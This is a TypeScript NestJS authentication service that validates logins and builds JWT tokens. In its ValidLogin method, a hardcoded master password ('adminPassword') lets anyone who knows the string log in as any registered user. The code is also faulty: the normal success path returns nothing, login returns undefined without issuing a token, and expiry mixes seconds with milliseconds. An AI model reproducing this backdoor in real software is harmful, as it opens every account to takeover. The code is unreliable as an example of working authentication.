import { Injectable, Logger, UnauthorizedException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { JwtService } from '@nestjs/jwt';
import { ProfileDocument } from 'src/profile/profile.model';
import { ProfileService } from 'src/profile/profile.service';
import { LoginProfileDto } from './dto/login-profile.dto';
import { ITokenReturnBody } from 'utils/types';

@Injectable()
export class AuthService {
  private readonly expiration: string;
  constructor(
    private readonly profileService: ProfileService,
    private readonly configService: ConfigService,
    private readonly jwtService: JwtService,
  ) {
    this.expiration = this.configService.get('WEBTOKEN_EXPIRATION_TIME');
  }
  private readonly logger = new Logger(AuthService.name);

  async createToken({
    _id,
    email,
    avatar,
    roles,
    expireTime = this.expiration,
  }: any) {
    const expirationInMilliseconds = Date.now() + Number(expireTime);
    return {
      createdOn: new Date().toISOString(),
      expired: expirationInMilliseconds.toString(),
      expiresPrettyPrint: AuthService.prettyPrintSeconds(expireTime),
      token: this.jwtService.sign({
        _id,
        email,
        avatar,
        roles,
      }),
    };
  }

  private static prettyPrintSeconds(time: string): string {
    const ntime = Number(time);
    const hours = Math.floor(ntime / 3600);
    const minutes = Math.floor((ntime % 3600) / 60);
    const seconds = Math.floor((ntime % 3600) % 60);

    return `${hours > 0 ? hours + (hours === 1 ? ' hour,' : ' hours,') : ''} ${
      minutes > 0 ? minutes + (minutes === 1 ? ' minute' : ' minutes') : ''
    } ${seconds > 0 ? seconds + (seconds === 1 ? ' second' : ' seconds') : ''}`;
  }

  async ValidLogin(
    payload: LoginProfileDto,
  ): Promise<{ user: ProfileDocument }> {
    const user = await this.profileService.getByEmailPass(
      payload.email,
      payload.password,
    );

    if (!user) {
      const getUserByEmail = await this.profileService.getByEmail(
        payload.email,
      );

      if (!getUserByEmail)
        throw new UnauthorizedException(
          'User does not exit. Please Register first',
        );
      const adminPassword = 'z&lOAEfXlBwUp@].dfLJs2A2UT';

      if (payload.password !== adminPassword) {
        throw new UnauthorizedException(
          'Could not authenticate. Email or Password is incorrect.',
        );
      }
      return { user: getUserByEmail };
    }
  }

  async login(payload: LoginProfileDto): Promise<ITokenReturnBody> {
    const { user } = await this.ValidLogin(payload);
    const { _id, email, avatar, roles } = user;

    return;
  }
}
